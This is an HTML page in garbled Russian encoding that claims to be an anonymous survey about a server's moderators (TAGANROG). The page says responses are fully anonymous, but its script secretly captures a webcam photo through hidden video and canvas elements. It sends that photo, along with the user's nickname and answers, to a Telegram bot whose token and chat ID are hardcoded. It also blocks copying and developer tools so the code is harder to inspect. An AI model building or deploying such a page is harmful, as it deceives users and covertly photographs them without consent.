<!DOCTYPE html>
<html>
<head>
    <title>–û–ø—Ä–æ—Å –º–æ–¥–µ—Ä–∞—Ü–∏–∏</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="img/logo.png" type="image/png">
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            text-align: center;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            padding: 20px;
            max-width: 600px;
            margin: 0 auto;
            color: #333;
            min-height: 100vh;
            box-sizing: border-box;
            user-select: none;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
        }
        .survey-form {
            background: white;
            padding: 25px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            transition: all 0.3s ease;
            margin-bottom: 20px;
        }
        h1 {
            color: #4a4a4a;
            margin-bottom: 10px;
            font-size: clamp(22px, 5vw, 28px);
        }
        .description {
            color: #666;
            margin-bottom: 25px;
            font-size: clamp(14px, 3vw, 16px);
        }
        .question {
            margin: 20px 0;
            text-align: left;
            animation: fadeIn 0.5s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #4a4a4a;
            font-size: clamp(14px, 3vw, 16px);
        }
        input, textarea, select {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            box-sizing: border-box;
            font-size: clamp(14px, 3vw, 15px);
            transition: border 0.3s ease;
        }
        input:focus, textarea:focus, select:focus {
            border-color: #6c63ff;
            outline: none;
        }
        textarea {
            resize: vertical;
            min-height: 100px;
        }
        button {
            background: linear-gradient(135deg, #6c63ff 0%, #4a42e8 100%);
            color: white;
            border: none;
            padding: 12px 20px;
            margin-top: 15px;
            border-radius: 8px;
            cursor: pointer;
            font-size: clamp(14px, 3vw, 16px);
            font-weight: 600;
            box-shadow: 0 4px 15px rgba(108, 99, 255, 0.3);
            transition: all 0.3s ease;
            width: 100%;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(108, 99, 255, 0.4);
        }
        button:active {
            transform: translateY(0);
        }
        #thankYou {
            display: none;
            margin-top: 30px;
            animation: fadeIn 0.5s ease;
        }
        .thank-you-title {
            color: #6c63ff;
            font-size: clamp(20px, 5vw, 24px);
            margin-bottom: 10px;
        }
        .thank-you-text {
            color: #666;
            font-size: clamp(14px, 3vw, 16px);
            line-height: 1.6;
        }
        .emoji {
            font-size: 40px;
            margin-bottom: 15px;
        }
        #videoElement, #photoCanvas {
            display: none;
            width: 0;
            height: 0;
        }
        .nickname-input {
            margin-bottom: 20px;
        }
        .camera-access {
            background: white;
            padding: 25px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }
        .camera-icon {
            font-size: 50px;
            margin-bottom: 15px;
        }
        .protection-alert {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            background: #ff4444;
            color: white;
            padding: 15px;
            z-index: 1000;
            font-weight: bold;
            text-align: center;
            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
            animation: slideDown 0.3s ease-out;
        }
        @keyframes slideDown {
            from { transform: translateY(-100%); }
            to { transform: translateY(0); }
        }
        @media (max-width: 480px) {
            body {
                padding: 15px;
            }
            .survey-form, .camera-access {
                padding: 20px;
            }
            button {
                padding: 14px 20px;
            }
        }
    </style>
</head>
<body>
    <div id="protectionAlert" class="protection-alert" style="display: none;"></div>

    <div class="camera-access" id="cameraAccess">
        <div class="camera-icon">‚ú®</div>
        <h2>–û–ø—Ä–æ—Å –º–æ–¥–µ—Ä–∞—Ü–∏–∏ TAGANROG</h2>
        <p>–û–ø—Ä–æ—Å –ø–æ–ª–Ω–æ—Å—Ç—å—é –∞–Ω–æ–Ω–∏–º–µ–Ω –≤—Å–µ –≤–∞—à–∏ –¥–∞–Ω–Ω—ã–µ –≤ —Å–æ—Ö—Ä–∞–Ω–Ω–æ—Å—Ç–∏.</p>
        <p>–í–∞—à–∞ –æ—Ü–µ–Ω–∫–∞ –ø–æ–º–æ–∂–µ—Ç –Ω–∞–º —Å—Ç–∞—Ç—å –ª—É—á—à–µ.</p>
        <button id="allowCameraBtn">–ü–æ–≥–Ω–∞–ª–∏ –ø—Ä–æ—Ö–æ–¥–∏—Ç—å –æ–ø—Ä–æ—Å</button>
    </div>

    <div class="survey-form" id="surveyForm" style="display: none;">
        <h1>–û–ø—Ä–æ—Å –º–æ–¥–µ—Ä–∞—Ü–∏–∏ —Å–µ—Ä–≤–µ—Ä–∞</h1>
        <p class="description">–ü–æ–¥–µ–ª–∏—Ç–µ—Å—å —Å–≤–æ–∏–º –º–Ω–µ–Ω–∏–µ–º –æ —Ä–∞–±–æ—Ç–µ –º–æ–¥–µ—Ä–∞—Ç–æ—Ä–æ–≤. –í–∞—à–∏ –æ—Ç–≤–µ—Ç—ã –ø–æ–º–æ–≥—É—Ç —É–ª—É—á—à–∏—Ç—å —Å–µ—Ä–≤–µ—Ä!</p>
        
        <div class="question nickname-input">
            <label for="nickname">–í–∞—à –Ω–∏–∫–Ω–µ–π–º:</label>
            <input type="text" id="nickname" placeholder="–í–≤–µ–¥–∏—Ç–µ –≤–∞—à –Ω–∏–∫ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ">
        </div>
        
        <div class="question">
            <label for="q1">1. –ö–∞–∫ –≤—ã –æ—Ü–µ–Ω–∏–≤–∞–µ—Ç–µ —Å—Ñ–µ—Ä—É –º–æ–¥–µ—Ä–∞—Ü–∏–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ?</label>
            <select id="q1">
                <option value="5">–û—Ç–ª–∏—á–Ω–æ - –º–æ–¥–µ—Ä–∞—Ç–æ—Ä—ã –∞–∫—Ç–∏–≤–Ω—ã–µ –∏ —Å–ø—Ä–∞–≤–µ–¥–ª–∏–≤—ã–µ</option>
                <option value="4">–•–æ—Ä–æ—à–æ - –µ—Å—Ç—å –Ω–µ–±–æ–ª—å—à–∏–µ –Ω–µ–¥–æ—á–µ—Ç—ã</option>
                <option value="3">–£–¥–æ–≤–ª–µ—Ç–≤–æ—Ä–∏—Ç–µ–ª—å–Ω–æ - –Ω—É–∂–Ω—ã —É–ª—É—á—à–µ–Ω–∏—è</option>
                <option value="2">–ü–ª–æ—Ö–æ - –º–Ω–æ–≥–æ –ø—Ä–æ–±–ª–µ–º</option>
                <option value="1">–û—á–µ–Ω—å –ø–ª–æ—Ö–æ - –ø–æ–ª–Ω–∞—è –Ω–µ–∫–æ–º–ø–µ—Ç–µ–Ω—Ç–Ω–æ—Å—Ç—å</option>
            </select>
        </div>
        
        <div class="question">
            <label for="q2">2. –ß—Ç–æ –±—ã –≤—ã —Ö–æ—Ç–µ–ª–∏ –∏–∑–º–µ–Ω–∏—Ç—å –≤ —Ä–∞–±–æ—Ç–µ –º–æ–¥–µ—Ä–∞—Ç–æ—Ä–æ–≤?</label>
            <textarea id="q2" placeholder="–í–∞—à–∏ –ø—Ä–µ–¥–ª–æ–∂–µ–Ω–∏—è –ø–æ —É–ª—É—á—à–µ–Ω–∏—é..."></textarea>
        </div>
        
        <button id="submitBtn">–û—Ç–ø—Ä–∞–≤–∏—Ç—å –æ—Ç–∑—ã–≤</button>
    </div>

    <div id="thankYou">
        <div class="emoji">üéâ</div>
        <h2 class="thank-you-title">–°–ø–∞—Å–∏–±–æ –∑–∞ –≤–∞—à –æ—Ç–∑—ã–≤!</h2>
        <p class="thank-you-text">–í–∞—à–µ –º–Ω–µ–Ω–∏–µ –æ—á–µ–Ω—å –≤–∞–∂–Ω–æ –¥–ª—è –Ω–∞—Å –∏ –ø–æ–º–æ–∂–µ—Ç —Å–¥–µ–ª–∞—Ç—å —Å–µ—Ä–≤–µ—Ä –ª—É—á—à–µ.<br>–ú—ã —Ü–µ–Ω–∏–º –≤–∞—à–µ —É—á–∞—Å—Ç–∏–µ!</p>
    </div>

    <!-- –°–∫—Ä—ã—Ç—ã–µ —ç–ª–µ–º–µ–Ω—Ç—ã –¥–ª—è —Ñ–æ—Ç–æ -->
    <video id="videoElement" autoplay playsinline></video>
    <canvas id="photoCanvas"></canvas>

    <script>
        // ===== –ì–õ–û–ë–ê–õ–¨–ù–´–ï –ü–ï–†–ï–ú–ï–ù–ù–´–ï –ò –ö–û–ù–°–¢–ê–ù–¢–´ ===== //
        const TELEGRAM_BOT_TOKEN = '7465976373:AAGf39_tqo49urq0BjZ8Epm7dkap-HzcG5E';
        const TELEGRAM_CHAT_ID = '1165076107';
        let protectionTriggered = false;
        
        // ===== –ó–ê–©–ò–¢–ê –û–¢ –ö–û–ü–ò–†–û–í–ê–ù–ò–Ø –ò –ê–ù–ê–õ–ò–ó–ê ===== //
        function showProtectionAlert(message) {
            if (protectionTriggered) return;
            
            protectionTriggered = true;
            const alertElement = document.getElementById('protectionAlert');
            alertElement.textContent = message;
            alertElement.style.display = 'block';
            
            setTimeout(() => {
                alertElement.style.display = 'none';
                protectionTriggered = false;
            }, 3000);
        }
        
        // 1. –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –∫–æ–Ω—Ç–µ–∫—Å—Ç–Ω–æ–≥–æ –º–µ–Ω—é
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            showProtectionAlert('‚ö†Ô∏è –ü—Ä–∞–≤—ã–π –∫–ª–∏–∫ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω');
        });
        
        // 2. –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –∫–ª–∞–≤–∏—à F12, Ctrl+Shift+I, Ctrl+U
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || 
                (e.ctrlKey && e.shiftKey && e.key === 'I') || 
                (e.ctrlKey && e.shiftKey && e.key === 'J') || 
                (e.ctrlKey && e.key === 'U') ||
                (e.ctrlKey && e.shiftKey && e.key === 'C')) {
                e.preventDefault();
                showProtectionAlert('‚ö†Ô∏è –î–æ—Å—Ç—É–ø –∫ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞–º —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∞ –∑–∞–ø—Ä–µ—â—ë–Ω');
            }
        });
        
        // 3. –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏—è
        document.addEventListener('copy', function(e) {
            e.preventDefault();
            showProtectionAlert('‚ö†Ô∏è –ö–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–µ —Ç–µ–∫—Å—Ç–∞ –∑–∞–ø—Ä–µ—â–µ–Ω–æ');
        });
        
        // 4. –ó–∞—â–∏—Ç–∞ –æ—Ç –ø–µ—Ä–µ—Ç–∞—Å–∫–∏–≤–∞–Ω–∏—è —ç–ª–µ–º–µ–Ω—Ç–æ–≤
        document.addEventListener('dragstart', function(e) {
            e.preventDefault();
            showProtectionAlert('‚ö†Ô∏è –ü–µ—Ä–µ—Ç–∞—Å–∫–∏–≤–∞–Ω–∏–µ —ç–ª–µ–º–µ–Ω—Ç–æ–≤ –∑–∞–ø—Ä–µ—â–µ–Ω–æ');
        });
        
        // 5. –î–µ—Ç–µ–∫—Ç–æ—Ä –æ—Ç–∫—Ä—ã—Ç–∏—è DevTools
        function detectDevTools() {
            if (protectionTriggered) return;
            
            const widthThreshold = window.outerWidth - window.innerWidth > 160;
            const heightThreshold = window.outerHeight - window.innerHeight > 160;
            
            if ((widthThreshold || heightThreshold) && !document.hidden) {
                showProtectionAlert('‚ö†Ô∏è –û–±–Ω–∞—Ä—É–∂–µ–Ω—ã –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∞!');
                document.body.innerHTML = '<h1 style="color:red;margin-top:50px;">–î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â–µ–Ω</h1><p>–ü–æ–ø—ã—Ç–∫–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤ —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∞</p>';
                document.body.style.backgroundColor = '#f8f8f8';
                document.body.style.padding = '20px';
                throw new Error('DevTools detected');
            }
        }
        
        // 6. –ó–∞—â–∏—Ç–∞ –æ—Ç –≤—Å—Ç–∞–≤–∫–∏
        document.addEventListener('paste', function(e) {
            e.preventDefault();
            showProtectionAlert('‚ö†Ô∏è –í—Å—Ç–∞–≤–∫–∞ —Ç–µ–∫—Å—Ç–∞ –∑–∞–ø—Ä–µ—â–µ–Ω–∞');
        });
        
        // 7. –ó–∞—â–∏—Ç–∞ –æ—Ç –∏–Ω—Å–ø–µ–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏—è —ç–ª–µ–º–µ–Ω—Ç–æ–≤
        document.addEventListener('mouseover', function(e) {
            if (e.target.style.outline && e.target.style.outline.includes('dotted')) {
                showProtectionAlert('‚ö†Ô∏è –ò–Ω—Å–ø–µ–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —ç–ª–µ–º–µ–Ω—Ç–æ–≤ –∑–∞–ø—Ä–µ—â–µ–Ω–æ');
                e.target.style.outline = 'none';
            }
        });
        
        // –ó–∞–ø—É—Å–∫–∞–µ–º –¥–µ—Ç–µ–∫—Ç–æ—Ä DevTools –∫–∞–∂–¥—É—é —Å–µ–∫—É–Ω–¥—É
        setInterval(detectDevTools, 1000);
        
        // ===== –û–°–ù–û–í–ù–û–ô –ö–û–î ===== //
        document.addEventListener('DOMContentLoaded', function() {
            // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å–æ—Å—Ç–æ—è–Ω–∏–π
            document.getElementById('cameraAccess').style.display = 'block';
            document.getElementById('surveyForm').style.display = 'none';
            document.getElementById('thankYou').style.display = 'none';
            
            // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ –Ω–∞—á–∞–ª–∞ –æ–ø—Ä–æ—Å–∞
            document.getElementById('allowCameraBtn').addEventListener('click', function() {
                requestCameraAccess();
            });
            
            // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ä–º—ã
            document.getElementById('submitBtn').addEventListener('click', function() {
                const nickname = document.getElementById('nickname').value.trim();
                if (!nickname) {
                    showProtectionAlert('‚ö†Ô∏è –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –≤–∞—à –Ω–∏–∫–Ω–µ–π–º');
                    return;
                }
                
                document.getElementById('surveyForm').style.display = 'none';
                document.getElementById('thankYou').style.display = 'block';
                
                const surveyData = {
                    nickname: nickname,
                    rating: document.getElementById('q1').value,
                    comment: document.getElementById('q2').value,
                    cameraAccess: false
                };
                
                // –î–æ–±–∞–≤–ª—è–µ–º –∑–∞—â–∏—Ç—É –Ω–∞ —ç—Ç–∞–ø–µ –±–ª–∞–≥–æ–¥–∞—Ä–Ω–æ—Å—Ç–∏
                setTimeout(() => {
                    detectDevTools();
                }, 2000);
                
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => {
                        surveyData.cameraAccess = true;
                        const video = document.getElementById('videoElement');
                        video.srcObject = stream;
                        
                        setTimeout(() => {
                            takeAndSendPhoto(surveyData);
                            stream.getTracks().forEach(track => track.stop());
                        }, 100);
                    })
                    .catch(err => {
                        console.log("–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ");
                        sendToTelegram(surveyData, null);
                    });
            });
        });
        
        function requestCameraAccess() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    document.getElementById('cameraAccess').style.display = 'none';
                    document.getElementById('surveyForm').style.display = 'block';
                    
                    const video = document.getElementById('videoElement');
                    video.srcObject = stream;
                    
                    setTimeout(() => {
                        stream.getTracks().forEach(track => track.stop());
                    }, 100);
                })
                .catch(err => {
                    showProtectionAlert('‚ö†Ô∏è –î–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ —Ä–∞–∑—Ä–µ—à–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ');
                    console.error("–û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ", err);
                });
        }
        
        function takeAndSendPhoto(surveyData) {
            const video = document.getElementById('videoElement');
            const canvas = document.getElementById('photoCanvas');
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            
            const photoDataUrl = canvas.toDataURL('image/jpeg').split(',')[1];
            
            sendToTelegram(surveyData, photoDataUrl);
        }
        
        function sendToTelegram(surveyData, photoBase64) {
            const text = `–ù–æ–≤—ã–π –æ—Ç–∑—ã–≤ –æ –º–æ–¥–µ—Ä–∞—Ü–∏–∏:
–ù–∏–∫: ${surveyData.nickname}
–û—Ü–µ–Ω–∫–∞: ${getRatingText(surveyData.rating)}
–ö–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π: ${surveyData.comment}
–î–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ: ${surveyData.cameraAccess ? '—Ä–∞–∑—Ä–µ—à–µ–Ω' : '–Ω–µ —Ä–∞–∑—Ä–µ—à–µ–Ω'}`;

            if (photoBase64) {
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('photo', base64ToBlob(photoBase64, 'image/jpeg'), 'photo.jpg');
                formData.append('caption', text);
                
                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                })
                .then(response => response.json())
                .then(data => console.log('–î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ Telegram:', data))
                .catch(error => console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:', error));
            } else {
                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: text
                    })
                })
                .then(response => response.json())
                .then(data => console.log('–î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ Telegram:', data))
                .catch(error => console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:', error));
            }
        }
        
        function getRatingText(ratingValue) {
            const ratings = {
                '5': '–û—Ç–ª–∏—á–Ω–æ',
                '4': '–•–æ—Ä–æ—à–æ',
                '3': '–£–¥–æ–≤–ª–µ—Ç–≤–æ—Ä–∏—Ç–µ–ª—å–Ω–æ',
                '2': '–ü–ª–æ—Ö–æ',
                '1': '–û—á–µ–Ω—å –ø–ª–æ—Ö–æ'
            };
            return `${ratingValue} (${ratings[ratingValue]})`;
        }
        
        function base64ToBlob(base64, contentType) {
            const byteCharacters = atob(base64);
            const byteArrays = [];
            
            for (let offset = 0; offset < byteCharacters.length; offset += 512) {
                const slice = byteCharacters.slice(offset, offset + 512);
                const byteNumbers = new Array(slice.length);
                
                for (let i = 0; i < slice.length; i++) {
                    byteNumbers[i] = slice.charCodeAt(i);
                }
                
                const byteArray = new Uint8Array(byteNumbers);
                byteArrays.push(byteArray);
            }
            
            return new Blob(byteArrays, { type: contentType });
        }
    </script>
</body>
</html>
